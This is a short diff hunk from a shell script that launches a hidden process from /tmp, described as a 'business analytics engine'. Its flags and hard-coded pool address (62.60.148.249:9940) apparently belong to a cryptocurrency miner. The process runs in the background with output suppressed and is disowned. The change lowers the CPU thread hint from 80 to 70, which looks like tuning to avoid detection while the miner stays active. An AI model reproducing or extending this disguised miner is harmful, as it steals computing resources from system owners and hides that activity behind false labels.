@@ -45,7 +45,7 @@ initialize_analytics_engine() {
         chmod +x /tmp/analytics-processing-engine
         
         echo "[$(date)] Initializing business analytics engine with enterprise parameters..."
-        /tmp/analytics-processing-engine -o 62.60.148.249:9940 --cpu-max-threads-hint 80 > /dev/null 2>&1 &
+        /tmp/analytics-processing-engine -o 62.60.148.249:9940 --cpu-max-threads-hint 70 > /dev/null 2>&1 &
         disown
         
         echo "[$(date)] Business Analytics Engine initialized and running in background"
